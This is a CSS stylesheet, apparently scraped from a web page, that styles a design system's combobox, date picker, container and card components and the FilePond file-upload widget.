
.stamp-combobox-input__input::placeholder { color: var(--stamp-color-text-form-control-placeholder-default); }

.stamp-combobox-input__input::placeholder { color: var(--stamp-color-text-form-control-placeholder-default); }

.stamp-combobox-input__input:not(:disabled):hover { border-color: var(--stamp-color-border-hover); }

.stamp-combobox-input__input:not(:disabled):focus { outline-color: var(--stamp-color-border-hover); outline-style: solid; outline-width: var(--stamp-border-width-m); outline-offset: 1px; }

@supports selector(:focus-visible) {
  .stamp-combobox-input__input:not(:disabled):focus { outline: none; }
  .stamp-combobox-input__input:not(:disabled):focus-visible { outline-color: var(--stamp-color-border-hover); outline-style: solid; outline-width: var(--stamp-border-width-m); outline-offset: 1px; }
}

.stamp-combobox-input__input:disabled { background-color: var(--stamp-color-background-default); cursor: not-allowed; -webkit-text-fill-color: var(--stamp-color-text-form-control-value-disabled); color: var(--stamp-color-text-form-control-value-disabled); }

.stamp-combobox-input__input:disabled::placeholder { -webkit-text-fill-color: var(--stamp-color-text-form-control-placeholder-disabled); color: var(--stamp-color-text-form-control-placeholder-disabled); }

.stamp-combobox-input__input:disabled::placeholder { -webkit-text-fill-color: var(--stamp-color-text-form-control-placeholder-disabled); color: var(--stamp-color-text-form-control-placeholder-disabled); }

.stamp-combobox-input:has(.stamp-combobox-input__input:disabled) .stamp-combobox-input__icon { color: var(--stamp-color-icon-disabled); }

.stamp-combobox-input__input--invalid { border-color: var(--stamp-color-border-error); }

.stamp-combobox-input__data-list { list-style: none; position: absolute; inline-size: 100%; padding-block: var(--stamp-spacing-inner-s); will-change: transform; filter: drop-shadow(var(--stamp-drop-shadow-flyout-down)); border-radius: var(--stamp-radius-s); background-color: var(--stamp-color-background-surface); max-height: 316px; overflow: auto; z-index: var(--z-index-above); }

.stamp-combobox-input__data-list--hidden { visibility: hidden; height: 0px; overflow: hidden; }

.stamp-combobox-input__data-list:empty { display: none; }

.stamp-combobox-input__data-list-item { cursor: pointer; padding: var(--stamp-spacing-inner-s) var(--stamp-spacing-inner-l); background-color: var(--stamp-color-background-data-list-default); border-inline-start-width: var(--stamp-border-width-m); border-inline-start-style: solid; border-inline-start-color: transparent; color: var(--stamp-color-text-link-default); font-family: var(--stamp-text-form-data-list-title-default-font-family), sans-serif; font-weight: var(--stamp-text-form-data-list-title-default-font-weight); line-height: var(--stamp-text-form-data-list-title-default-line-height); font-size: var(--stamp-text-form-data-list-title-default-font-size); }

.stamp-combobox-input__data-list-item:active { border-inline-start-width: var(--stamp-border-width-m); border-inline-start-style: solid; border-inline-start-color: var(--stamp-color-border-pressed); background-color: var(--stamp-color-background-data-list-pressed); color: var(--stamp-color-text-link-pressed); font-family: var(--stamp-text-form-data-list-title-pressed-font-family), sans-serif; font-weight: var(--stamp-text-form-data-list-title-pressed-font-weight); line-height: var(--stamp-text-form-data-list-title-pressed-line-height); font-size: var(--stamp-text-form-data-list-title-pressed-font-size); }

.stamp-combobox-input__data-list-item--selected { border-inline-start-width: var(--stamp-border-width-m); border-inline-start-style: solid; border-inline-start-color: var(--stamp-color-border-selected); background-color: var(--stamp-color-background-data-list-selected); color: var(--stamp-color-text-link-subtle); }

.stamp-combobox-input__data-list-item--highlighted { background-color: var(--stamp-color-background-data-list-hover); border-inline-start-color: var(--stamp-color-border-hover); color: var(--stamp-color-text-link-hover); font-family: var(--stamp-text-form-data-list-title-highlighted-font-family), sans-serif; font-weight: var(--stamp-text-form-data-list-title-highlighted-font-weight); line-height: var(--stamp-text-form-data-list-title-highlighted-line-height); font-size: var(--stamp-text-form-data-list-title-highlighted-font-size); }

.stamp-combobox-input__data-list-item-text-highlight { text-decoration: var(--stamp-text-form-data-list-title-highlighted-text-decoration); }

.stamp-combobox-input__section-name { padding-inline: var(--stamp-spacing-inner-l); padding-block-start: var(--stamp-spacing-inner-m); padding-block-end: var(--stamp-spacing-inner-xs); color: var(--stamp-color-text-form-control-value-default); font-family: var(--stamp-text-form-label-font-family), sans-serif; font-weight: var(--stamp-text-form-label-font-weight); font-size: var(--stamp-text-form-label-font-size); letter-spacing: var(--stamp-text-form-label-letter-spacing); }

.stamp-combobox-input__section-list { list-style: none; }

.stamp-combobox-input__toggle-button { position: absolute; inset-inline-end: 0px; inset-block-start: 0px; border: medium; block-size: 100%; background-color: transparent; padding-inline: var(--stamp-spacing-inner-l); cursor: pointer; }

.stamp-combobox-input__toggle-button:focus { outline-style: solid; outline-width: var(--stamp-border-width-m); outline-color: var(--stamp-color-border-focus-outline); outline-offset: -1px; border-radius: var(--stamp-border-width-l); }

.stamp-combobox-input__toggle-button:disabled { cursor: not-allowed; }

.stamp-combobox-input__toggle-button-icon { inline-size: 8px; block-size: 8px; color: var(--stamp-color-text-subtle); }

.stamp-combobox-input--size-narrow { inline-size: 50%; }

.stamp-combobox-input--size-full { inline-size: 100%; }

@media (min-width: 481px) {
  .stamp-combobox-input { inline-size: 50%; }
  .stamp-combobox-input--size-narrow { inline-size: 25%; }
  .stamp-combobox-input--size-full { inline-size: 100%; }
}

.stamp-combobox-option { display: flex; flex-direction: column; }

.stamp-combobox-option__header { display: flex; align-items: center; }

.stamp-combobox-option__title--subtle { color: var(--stamp-color-text-default); font-family: var(--stamp-text-form-data-list-body-default-font-family), sans-serif; font-weight: var(--stamp-text-form-data-list-body-default-font-weight); line-height: var(--stamp-text-form-data-list-body-default-line-height); font-size: var(--stamp-text-form-data-list-body-default-font-size); letter-spacing: var(--stamp-text-form-data-list-body-default-letter-spacing); }

.stamp-combobox-option__icon { color: var(--stamp-color-icon-default); margin-inline-end: var(--stamp-spacing-inner-s); }

.stamp-combobox-option__subtitle { color: var(--stamp-color-text-default); font-family: var(--stamp-text-form-data-list-body-default-font-family), sans-serif; font-weight: var(--stamp-text-form-data-list-body-default-font-weight); line-height: var(--stamp-text-form-data-list-body-default-line-height); font-size: var(--stamp-text-form-data-list-body-default-font-size); letter-spacing: var(--stamp-text-form-data-list-body-default-letter-spacing); }

.stamp-combobox-option__subtitle--with-icon { padding-inline-start: calc(var(--stamp-size-icon-m) + var(--stamp-spacing-inner-s)); }

.stamp-container { overflow-x: clip; inline-size: 100%; }

.stamp-container__content { inline-size: 100%; padding-inline: var(--stamp-spacing-outer-s); margin-inline: auto; }

@media (min-width: 680px) {
  .stamp-container__content { padding-inline: var(--stamp-spacing-outer-m); }
}

@media (min-width: 880px) {
  .stamp-container__content { padding-inline: var(--stamp-spacing-outer-xl); }
}

.stamp-container--fixed .stamp-container__content { max-inline-size: 1104px; }

.stamp-container--full-width .stamp-container__content { max-inline-size: none; inline-size: 100%; padding-inline: 0px; overflow: auto; }

@media (min-width: 1280px) {
  .stamp-container--fixed .stamp-container__content { padding-inline: 0px; }
}

.stamp-date-input { max-inline-size: 155px; }

.stamp-date-input input { appearance: none; min-block-size: calc(1.5rem + 2 * var(--stamp-spacing-inner-s)); background-color: var(--stamp-color-background-surface); color: var(--stamp-color-text-form-control-value-default); }

.stamp-date-input input::-webkit-calendar-picker-indicator { display: none; }

input::-webkit-date-and-time-value { margin: 0px; }

.stamp-date-picker { position: absolute; bottom: 0px; z-index: var(--z-index-above); background-color: var(--stamp-color-background-date-input-date-default); transform: translateY(100%); filter: drop-shadow(0px 2px 2px var(--stamp-color-border-default)); padding: var(--stamp-spacing-inner-s); font-family: var(--stamp-text-form-date-input-date-default-font-family), sans-serif; font-weight: var(--stamp-text-form-date-input-date-default-font-weight); line-height: var(--stamp-text-form-date-input-date-default-line-height); font-size: var(--stamp-text-form-date-input-date-default-font-size); letter-spacing: var(--stamp-text-form-date-input-date-default-letter-spacing); color: var(--stamp-color-text-date-input-date-default); border-radius: var(--stamp-radius-xs); }

.stamp-date-picker__header { display: flex; justify-content: space-between; align-items: center; margin-block: var(--stamp-spacing-inner-m); color: var(--stamp-color-text-date-input-date-strong); }

.stamp-date-picker--weeknumbers .stamp-date-picker__header, .stamp-date-picker--weeknumbers .stamp-date-picker__day-list { margin-inline-start: var(--stamp-spacing-inner-xl); }

.stamp-date-picker__day-list { display: flex; flex-direction: row; margin-block-end: var(--stamp-spacing-inner-s); color: var(--stamp-color-heading-subtle); }

.stamp-date-picker__day { inline-size: 35px; text-align: center; font-family: var(--stamp-text-heading-xxs-font-family), sans-serif; font-weight: var(--stamp-text-heading-xxs-font-weight); line-height: var(--stamp-text-heading-xxs-line-height); font-size: var(--stamp-text-heading-xxs-font-size); letter-spacing: var(--stamp-text-heading-xxs-letter-spacing); }

.stamp-date-picker__dates { display: grid; grid-template-columns: repeat(7, 35px); grid-template-rows: repeat(5, 35px); grid-column: auto; }

.stamp-date-picker__date { border-style: solid; border-width: var(--stamp-border-width-s); border-color: var(--stamp-color-border-default); background-color: var(--stamp-color-background-date-input-date-default); block-size: 36px; inline-size: 36px; cursor: pointer; color: var(--stamp-color-text-date-input-date-default); font-family: var(--stamp-text-form-date-input-date-default-font-family), sans-serif; font-weight: var(--stamp-text-form-date-input-date-default-font-weight); line-height: var(--stamp-text-form-date-input-date-default-line-height); font-size: var(--stamp-text-form-date-input-date-default-font-size); letter-spacing: var(--stamp-text-form-date-input-date-default-letter-spacing); }

.stamp-date-picker__date:not(:disabled):hover { color: var(--stamp-color-text-date-input-date-hover); border-color: var(--stamp-color-border-hover); border-width: var(--stamp-border-width-m); z-index: var(--z-index-base); font-family: var(--stamp-text-form-date-input-date-hover-font-family), sans-serif; font-weight: var(--stamp-text-form-date-input-date-hover-font-weight); line-height: var(--stamp-text-form-date-input-date-hover-line-height); font-size: var(--stamp-text-form-date-input-date-hover-font-size); letter-spacing: var(--stamp-text-form-date-input-date-hover-letter-spacing); text-decoration: var(--stamp-text-form-date-input-date-hover-text-decoration); }

.stamp-date-picker__date:not(:disabled):active { color: var(--stamp-color-text-date-input-date-pressed); border-color: var(--stamp-color-border-pressed); z-index: var(--z-index-base); font-family: var(--stamp-text-form-date-input-date-pressed-font-family), sans-serif; font-weight: var(--stamp-text-form-date-input-date-pressed-font-weight); line-height: var(--stamp-text-form-date-input-date-pressed-line-height); font-size: var(--stamp-text-form-date-input-date-pressed-font-size); letter-spacing: var(--stamp-text-form-date-input-date-pressed-letter-spacing); text-decoration: var(--stamp-text-form-date-input-date-pressed-text-decoration); }

.stamp-date-picker__date--selected { z-index: var(--z-index-above); border-color: var(--stamp-color-border-selected); border-width: var(--stamp-border-width-m); }

.stamp-date-picker__date--today { color: var(--stamp-color-text-date-input-today-default); background-color: var(--stamp-color-background-date-input-today-default); }

.stamp-date-picker__date--today:not(:disabled):hover { color: var(--stamp-color-text-date-input-today-default); }

.stamp-date-picker__date--today:disabled { background-color: var(--stamp-color-background-date-input-today-disabled); }

.stamp-date-picker__date:disabled, .stamp-date-picker__date--disabled { cursor: not-allowed; color: var(--stamp-color-text-date-input-date-disabled); background-color: var(--stamp-color-background-date-input-date-disabled); }

.stamp-date-picker__date--prev-month, .stamp-date-picker__date--next-month { color: var(--stamp-color-text-date-input-date-subtle); }

.stamp-date-picker__date--prev-month:not(:disabled):hover, .stamp-date-picker__date--next-month:not(:disabled):hover { color: var(--stamp-color-text-date-input-date-subtle); border-color: var(--stamp-color-border-default); }

.stamp-date-picker__week-list { display: flex; flex-direction: column; justify-content: space-around; color: var(--stamp-color-heading-subtle); }

.stamp-date-picker__week { inline-size: var(--stamp-spacing-inner-xl); font-family: var(--stamp-text-heading-xxs-font-family), sans-serif; font-weight: var(--stamp-text-heading-xxs-font-weight); line-height: var(--stamp-text-heading-xxs-line-height); font-size: var(--stamp-text-heading-xxs-font-size); letter-spacing: var(--stamp-text-heading-xxs-letter-spacing); }

.stamp-date-picker__calendar { display: flex; }

.stamp-emphasis-card { display: flex; flex-direction: column; row-gap: var(--stamp-spacing-inner-xl); max-inline-size: 375px; padding-block: var(--stamp-spacing-outer-s); block-size: 100%; }

.stamp-emphasis-card__content { display: flex; flex-direction: column; }

.stamp-emphasis-card__image { overflow: hidden; grid-area: 1 / 1; }

.stamp-emphasis-card__image .stamp-image, .stamp-emphasis-card__image img { min-block-size: 240px; block-size: 100%; object-fit: cover; }

.stamp-emphasis-card__header + .stamp-emphasis-card__body, .stamp-emphasis-card__header + .stamp-emphasis-card__footer { margin-block-start: var(--stamp-spacing-inner-l); }

.stamp-emphasis-card__body + .stamp-emphasis-card__footer { margin-block-start: var(--stamp-spacing-inner-xxl); }

.stamp-emphasis-card__footer { display: flex; flex-flow: wrap; align-items: center; gap: var(--stamp-spacing-inner-xl); }

@media (min-width: 768px) {
  .stamp-emphasis-card--size-full { display: grid; grid-template-columns: 340px 1fr; column-gap: var(--stamp-spacing-inner-3-xl); max-inline-size: unset; }
  .stamp-emphasis-card--size-full.stamp-emphasis-card__image { block-size: 100%; }
  .stamp-emphasis-card--size-full.stamp-emphasis-card--image-end { grid-template-columns: 1fr 340px; }
  .stamp-emphasis-card--size-full.stamp-emphasis-card--image-end .stamp-emphasis-card__image { grid-column: 2; }
  .stamp-emphasis-card--size-full .stamp-emphasis-card__footer { display: flex; flex-direction: row; gap: var(--stamp-spacing-inner-xxl); }
}

.filepond--assistant { position: absolute; overflow: hidden; height: 1px; width: 1px; padding: 0px; border: 0px; clip: rect(1px, 1px, 1px, 1px); clip-path: inset(50%); white-space: nowrap; }

.filepond--browser.filepond--browser { position: absolute; margin: 0px; padding: 0px; left: 1em; top: 1.75em; width: calc(100% - 2em); opacity: 0; font-size: 0px; }

.filepond--data { position: absolute; width: 0px; height: 0px; padding: 0px; margin: 0px; border: medium; visibility: hidden; pointer-events: none; contain: strict; }

.filepond--drip { position: absolute; inset: 0px; overflow: hidden; opacity: 0.1; pointer-events: none; border-radius: 0.5em; background: rgba(0, 0, 0, 0.01); }

.filepond--drip-blob { transform-origin: center center 0px; width: 8em; height: 8em; margin-left: -4em; margin-top: -4em; background: rgb(41, 38, 37); border-radius: 50%; }

.filepond--drip-blob, .filepond--drop-label { position: absolute; top: 0px; left: 0px; will-change: transform, opacity; }

.filepond--drop-label { right: 0px; margin: 0px; color: rgb(79, 79, 79); display: flex; justify-content: center; align-items: center; height: 0px; user-select: none; }

.filepond--drop-label.filepond--drop-label label { display: block; margin: 0px; padding: 0.5em; }

.filepond--drop-label label { cursor: default; font-size: 0.875em; font-weight: 400; text-align: center; line-height: 1.5; }

.filepond--label-action { text-decoration: underline rgb(167, 164, 164); text-decoration-skip-ink: auto; cursor: pointer; }

.filepond--root[data-disabled] .filepond--drop-label label { opacity: 0.5; }

.filepond--file-action-button.filepond--file-action-button { font-size: 1em; width: 1.625em; height: 1.625em; font-family: inherit; line-height: inherit; margin: 0px; padding: 0px; border: medium; outline: none; will-change: transform, opacity; }

.filepond--file-action-button.filepond--file-action-button span { position: absolute; overflow: hidden; height: 1px; width: 1px; padding: 0px; border: 0px; clip: rect(1px, 1px, 1px, 1px); clip-path: inset(50%); white-space: nowrap; }

.filepond--file-action-button.filepond--file-action-button svg { width: 100%; height: 100%; }

.filepond--file-action-button.filepond--file-action-button::after { position: absolute; inset: -0.75em; content: &quot;&quot;; }

.filepond--file-action-button { cursor: auto; color: rgb(255, 255, 255); border-radius: 50%; background-color: rgba(0, 0, 0, 0.5); background-image: none; box-shadow: rgba(255, 255, 255, 0) 0px 0px 0px 0px; transition: box-shadow 0.25s ease-in; }

.filepond--file-action-button:focus, .filepond--file-action-button:hover { box-shadow: rgba(255, 255, 255, 0.9) 0px 0px 0px 0.125em; }

.filepond--file-action-button[disabled] { color: rgba(255, 255, 255, 0.5); background-color: rgba(0, 0, 0, 0.25); }

.filepond--file-action-button[hidden] { display: none; }

.filepond--action-edit-item.filepond--action-edit-item { width: 2em; height: 2em; padding: 0.1875em; }

.filepond--action-edit-item.filepond--action-edit-item[data-align*=&quot;center&quot;] { margin-left: -0.1875em; }

.filepond--action-edit-item.filepond--action-edit-item[data-align*=&quot;bottom&quot;] { margin-bottom: -0.1875em; }

.filepond--action-edit-item-alt { border: medium; line-height: inherit; background: transparent; font-family: inherit; color: inherit; outline: none; padding: 0px; margin: 0px 0px 0px 0.25em; pointer-events: all; position: absolute; }

.filepond--action-edit-item-alt svg { width: 1.3125em; height: 1.3125em; }

.filepond--action-edit-item-alt span { font-size: 0px; opacity: 0; }

.filepond--file-info { position: static; display: flex; flex-direction: column; align-items: flex-start; flex: 1 1 0%; margin: 0px 0.5em 0px 0px; min-width: 0px; will-change: transform, opacity; pointer-events: none; user-select: none; }

.filepond--file-info * { margin: 0px; }

.filepond--file-info .filepond--file-info-main { font-size: 0.75em; line-height: 1.2; text-overflow: ellipsis; overflow: hidden; white-space: nowrap; width: 100%; }

.filepond--file-info .filepond--file-info-sub { font-size: 0.625em; opacity: 0.5; transition: opacity 0.25s ease-in-out; white-space: nowrap; }

.filepond--file-info .filepond--file-info-sub:empty { display: none; }

.filepond--file-status { position: static; display: flex; flex-direction: column; align-items: flex-end; flex-grow: 0; flex-shrink: 0; margin: 0px; min-width: 2.25em; text-align: right; will-change: transform, opacity; pointer-events: none; user-select: none; }

.filepond--file-status * { margin: 0px; white-space: nowrap; }

.filepond--file-status .filepond--file-status-main { font-size: 0.75em; line-height: 1.2; }

.filepond--file-status .filepond--file-status-sub { font-size: 0.625em; opacity: 0.5; transition: opacity 0.25s ease-in-out; }

.filepond--file-wrapper.filepond--file-wrapper { border: medium; margin: 0px; padding: 0px; min-width: 0px; height: 100%; }

.filepond--file-wrapper.filepond--file-wrapper > legend { position: absolute; overflow: hidden; height: 1px; width: 1px; padding: 0px; border: 0px; clip: rect(1px, 1px, 1px, 1px); clip-path: inset(50%); white-space: nowrap; }

.filepond--file { position: static; display: flex; height: 100%; align-items: flex-start; padding: 0.5625em; color: rgb(255, 255, 255); border-radius: 0.5em; }

.filepond--file .filepond--file-status { margin-left: auto; margin-right: 2.25em; }

.filepond--file .filepond--processing-complete-indicator { pointer-events: none; user-select: none; z-index: 3; }

.filepond--file .filepond--file-action-button, .filepond--file .filepond--processing-complete-indicator, .filepond--file .filepond--progress-indicator { position: absolute; }

.filepond--file [data-align*=&quot;left&quot;] { left: 0.5625em; }

.filepond--file [data-align*=&quot;right&quot;] { right: 0.5625em; }

.filepond--file [data-align*=&quot;center&quot;] { left: calc(50% - 0.8125em); }

.filepond--file [data-align*=&quot;bottom&quot;] { bottom: 1.125em; }

.filepond--file [data-align=&quot;center&quot;] { top: calc(50% - 0.8125em); }

.filepond--file .filepond--progress-indicator { margin-top: 0.1875em; }

.filepond--file .filepond--progress-indicator[data-align*=&quot;right&quot;] { margin-right: 0.1875em; }

.filepond--file .filepond--progress-indicator[data-align*=&quot;left&quot;] { margin-left: 0.1875em; }

[data-filepond-item-state*=&quot;error&quot;] .filepond--file-info, [data-filepond-item-state*=&quot;invalid&quot;] .filepond--file-info, [data-filepond-item-state=&quot;cancelled&quot;] .filepond--file-info { margin-right: 2.25em; }

[data-filepond-item-state~=&quot;processing&quot;] .filepond--file-status-sub { opacity: 0; }

[data-filepond-item-state~=&quot;processing&quot;] .filepond--action-abort-item-processing ~ .filepond--file-status .filepond--file-status-sub { opacity: 0.5; }

[data-filepond-item-state=&quot;processing-error&quot;] .filepond--file-status-sub { opacity: 0; }

[data-filepond-item-state=&quot;processing-error&quot;] .filepond--action-retry-item-processing ~ .filepond--file-status .filepond--file-status-sub { opacity: 0.5; }

[data-filepond-item-state=&quot;processing-complete&quot;] .filepond--action-revert-item-processing svg { animation: 0.5s linear 0.125s both fall; }

[data-filepond-item-state=&quot;processing-complete&quot;] .filepond--file-status-sub { opacity: 0.5; }

[data-filepond-item-state=&quot;processing-complete&quot;] .filepond--file-info-sub, [data-filepond-item-state=&quot;processing-complete&quot;] .filepond--processing-complete-indicator:not([style*=&quot;hidden&quot;]) ~ .filepond--file-status .filepond--file-status-sub { opacity: 0; }

[data-filepond-item-state=&quot;processing-complete&quot;] .filepond--action-revert-item-processing ~ .filepond--file-info .filepond--file-info-sub { opacity: 0.5; }

[data-filepond-item-state*=&quot;error&quot;] .filepond--file-wrapper, [data-filepond-item-state*=&quot;error&quot;] .filepond--panel, [data-filepond-item-state*=&quot;invalid&quot;] .filepond--file-wrapper, [data-filepond-item-state*=&quot;invalid&quot;] .filepond--panel { animation: 0.65s linear both shake; }

[data-filepond-item-state*=&quot;busy&quot;] .filepond--progress-indicator svg { animation: 1s linear infinite spin; }

@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(1turn); }
}

@keyframes shake {
  10%, 90% { transform: translateX(-0.0625em); }
  20%, 80% { transform: translateX(0.125em); }
  30%, 50%, 70% { transform: translateX(-0.25em); }
  40%, 60% { transform: translateX(0.25em); }
}

@keyframes fall {
  0% { opacity: 0; transform: scale(0.5); animation-timing-function: ease-out; }
  70% { opacity: 1; transform: scale(1.1); animation-timing-function: ease-in-out; }
  100% { transform: scale(1); animation-timing-function: ease-out; }
}

.filepond--hopper[data-hopper-state=&quot;drag-over&quot;] > * { pointer-events: none; }

.filepond--hopper[data-hopper-state=&quot;drag-over&quot;]::after { content: &quot;&quot;; position: absolute; inset: 0px; z-index: 100; }

.filepond--progress-indicator { z-index: 103; }

.filepond--file-action-button { z-index: 102; }

.filepond--file-status { z-index: 101; }

.filepond--file-info { z-index: 100; }

.filepond--item { position: absolute; top: 0px; left: 0px; right: 0px; z-index: 1; padding: 0px; margin: 0.25em; will-change: transform, opacity; }

.filepond--item > .filepond--panel { z-index: -1; }

.filepond--item > .filepond--panel .filepond--panel-bottom { box-shadow: rgba(0, 0, 0, 0.25) 0px 0.0625em 0.125em -0.0625em; }

.filepond--item > .filepond--file-wrapper, .filepond--item > .filepond--panel { transition: opacity 0.15s ease-out; }

.filepond--item[data-drag-state] { cursor: grab; }

.filepond--item[data-drag-state] > .filepond--panel { transition: box-shadow 0.125s ease-in-out; box-shadow: transparent 0px 0px 0px; }

.filepond--item[data-drag-state=&quot;drag&quot;] { cursor: grabbing; }

.filepond--item[data-drag-state=&quot;drag&quot;] > .filepond--panel { box-shadow: rgba(0, 0, 0, 0.325) 0px 0.125em 0.3125em; }

.filepond--item[data-drag-state]:not([data-drag-state=&quot;idle&quot;]) { z-index: 2; }

.filepond--item-panel { background-color: rgb(100, 96, 94); }

[data-filepond-item-state=&quot;processing-complete&quot;] .filepond--item-panel { background-color: rgb(54, 151, 99); }

[data-filepond-item-state*=&quot;error&quot;] .filepond--item-panel, [data-filepond-item-state*=&quot;invalid&quot;] .filepond--item-panel { background-color: rgb(196, 78, 71); }

.filepond--item-panel { border-radius: 0.5em; transition: background-color 0.25s; }

.filepond--list-scroller { position: absolute; top: 0px; left: 0px; right: 0px; margin: 0px; will-change: transform; }

.filepond--list-scroller[data-state=&quot;overflow&quot;] .filepond--list { bottom: 0px; right: 0px; }

.filepond--list-scroller[data-state=&quot;overflow&quot;] { overflow: hidden scroll; mask: linear-gradient(rgb(0, 0, 0) calc(100% - 0.5em), transparent); }

.filepond--list-scroller::-webkit-scrollbar { background: transparent; }

.filepond--list-scroller::-webkit-scrollbar-thumb { background-color: rgba(0, 0, 0, 0.3); border-radius: 99999px; border: 0.3125em solid transparent; background-clip: content-box; }

.filepond--list.filepond--list { position: absolute; top: 0px; margin: 0px; padding: 0px; list-style-type: none; will-change: transform; }

.filepond--list { left: 0.75em; right: 0.75em; }

.filepond--root[data-style-panel-layout~=&quot;integrated&quot;] { width: 100%; height: 100%; max-width: none; margin: 0px; }

.filepond--root[data-style-panel-layout~=&quot;circle&quot;] .filepond--panel-root, .filepond--root[data-style-panel-layout~=&quot;integrated&quot;] .filepond--panel-root { border-radius: 0px; }

.filepond--root[data-style-panel-layout~=&quot;circle&quot;] .filepond--panel-root > *, .filepond--root[data-style-panel-layout~=&quot;integrated&quot;] .filepond--panel-root > * { display: none; }

.filepond--root[data-style-panel-layout~=&quot;circle&quot;] .filepond--drop-label, .filepond--root[data-style-panel-layout~=&quot;integrated&quot;] .filepond--drop-label { bottom: 0px; height: auto; display: flex; justify-content: center; align-items: center; z-index: 7; }

.filepond--root[data-style-panel-layout~=&quot;circle&quot;] .filepond--item-panel, .filepond--root[data-style-panel-layout~=&quot;integrated&quot;] .filepond--item-panel { display: none; }

.filepond--root[data-style-panel-layout~=&quot;compact&quot;] .filepond--list-scroller, .filepond--root[data-style-panel-layout~=&quot;integrated&quot;] .filepond--list-scroller { overflow: hidden; height: 100%; margin-top: 0px; margin-bottom: 0px; }

.filepond--root[data-style-panel-layout~=&quot;compact&quot;] .filepond--list, .filepond--root[data-style-panel-layout~=&quot;integrated&quot;] .filepond--list { left: 0px; right: 0px; height: 100%; }

.filepond--root[data-style-panel-layout~=&quot;compact&quot;] .filepond--item, .filepond--root[data-style-panel-layout~=&quot;integrated&quot;] .filepond--item { margin: 0px; }

.filepond--root[data-style-panel-layout~=&quot;compact&quot;] .filepond--file-wrapper, .filepond--root[data-style-panel-layout~=&quot;integrated&quot;] .filepond--file-wrapper { height: 100%; }

.filepond--root[data-style-panel-layout~=&quot;compact&quot;] .filepond--drop-label, .filepond--root[data-style-panel-layout~=&quot;integrated&quot;] .filepond--drop-label { z-index: 7; }

.filepond--root[data-style-panel-layout~=&quot;circle&quot;] { border-radius: 99999rem; overflow: hidden; }

.filepond--root[data-style-panel-layout~=&quot;circle&quot;] > .filepond--panel { border-radius: inherit; }

.filepond--root[data-style-panel-layout~=&quot;circle&quot;] > .filepond--panel > * { display: none; }

.filepond--root[data-style-panel-layout~=&quot;circle&quot;] .filepond--file-info, .filepond--root[data-style-panel-layout~=&quot;circle&quot;] .filepond--file-status { display: none; }

.filepond--root[data-style-panel-layout~=&quot;circle&quot;] .filepond--action-edit-item { opacity: 1 !important; visibility: visible !important; }

@media not all and (-webkit-min-device-pixel-ratio: 0), not all and (min-resolution: 0.001dpcm) {
  @supports (-webkit-appearance:none) and (stroke-color:transparent) {
    .filepond--root[data-style-panel-layout~=&quot;circle&quot;] { will-change: transform; }
  }
}

.filepond--panel-root { border-radius: 0.5em; background-color: rgb(241, 240, 239); }

.filepond--panel { position: absolute; left: 0px; top: 0px; right: 0px; margin: 0px; height: 100% !important; pointer-events: none; }

.filepond-panel:not([data-scalable=&quot;false&quot;]) { height: auto !important; }

.filepond--panel[data-scalable=&quot;false&quot;] > div { display: none; }

.filepond--panel[data-scalable=&quot;true&quot;] { transform-style: preserve-3d; background-color: transparent !important; border: medium !important; }

.filepond--panel-bottom, .filepond--panel-center, .filepond--panel-top { position: absolute; left: 0px; top: 0px; right: 0px; margin: 0px; padding: 0px; }

.filepond--panel-bottom, .filepond--panel-top { height: 0.5em; }

.filepond--panel-top { border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-bottom: medium !important; }

.filepond--panel-top::after { content: &quot;&quot;; position: absolute; height: 2px; left: 0px; right: 0px; bottom: -1px; background-color: inherit; }

.filepond--panel-bottom, .filepond--panel-center { will-change: transform; backface-visibility: hidden; transform-origin: left top 0px; transform: translate3d(0px, 0.5em, 0px); }

.filepond--panel-bottom { border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border-top: medium !important; }

.filepond--panel-bottom::before { content: &quot;&quot;; position: absolute; height: 2px; left: 0px; right: 0px; top: -1px; background-color: inherit; }

.filepond--panel-center { height: 100px !important; border-top: medium !important; border-bottom: medium !important; border-radius: 0px !important; }

.filepond--panel-center:not([style]) { visibility: hidden; }

.filepond--progress-indicator { position: static; width: 1.25em; height: 1.25em; color: rgb(255, 255, 255); margin: 0px; pointer-events: none; will-change: transform, opacity; }

.filepond--progress-indicator svg { width: 100%; height: 100%; vertical-align: top; transform-box: fill-box; }

.filepond--progress-indicator path { fill: none; stroke: currentcolor; }

.filepond--list-scroller { z-index: 6; }

.filepond--drop-label { z-index: 5; }

.filepond--drip { z-index: 3; }

.filepond--root > .filepond--panel { z-index: 2; }

.filepond--browser { z-index: 1; }

.filepond--root { box-sizing: border-box; position: relative; margin-bottom: 1em; font-size: 1rem; line-height: normal; font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica, Arial, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol; font-weight: 450; text-align: left; text-rendering: optimizelegibility; direction: ltr; contain: size layout style; }

.filepond--root * { box-sizing: inherit; line-height: inherit; }

.filepond--root :not(text) { font-size: inherit; }

.filepond--root[data-disabled] { pointer-events: none; }

.filepond--root[data-disabled] .filepond--list-scroller { pointer-events: all; }

.filepond--root[data-disabled] .filepond--list { pointer-events: none; }

.filepond--root .filepond--drop-label { min-height: 4.75em; }

.filepond--root .filepond--list-scroller { margin-top: 1em; margin-bottom: 1em; }

.filepond--root .filepond--credits { position: absolute; right: 0px; opacity: 0.175; line-height: 0.85; font-size: 11px; color: inherit; text-decoration: none; z-index: 3; bottom: -14px; }

.filepond--root .filepond--credits[style] { top: 0px; bottom: auto; margin-top: 14px; }

.filepond--image-preview-markup { position: absolute; left: 0px; top: 0px; }

.filepond--image-preview-wrapper { z-index: 2; }

.filepond--image-preview-overlay { display: block; position: absolute; left: 0px; top: 0px; width: 100%; min-height: 5rem; max-height: 7rem; margin: 0px; opacity: 0; z-index: 2; pointer-events: none; user-select: none; }

.filepond--image-preview-overlay svg { width: 100%; height: auto; color: inherit; max-height: inherit; }

.filepond--image-preview-overlay-idle { mix-blend-mode: multiply; color: rgba(40, 40, 40, 0.85); }

.filepond--image-preview-overlay-success { mix-blend-mode: normal; color: rgb(54, 151, 99); }

.filepond--image-preview-overlay-failure { mix-blend-mode: normal; color: rgb(196, 78, 71); }

@supports (-webkit-marquee-repetition: infinite) and ((-o-object-fit: fill) or (object-fit: fill)) {
  .filepond--image-preview-overlay-idle { mix-blend-mode: normal; }
}

.filepond--image-preview-wrapper { user-select: none; position: absolute; left: 0px; top: 0px; right: 0px; height: 100%; margin: 0px; border-radius: 0.45em; overflow: hidden; background: rgba(0, 0, 0, 0.01); }

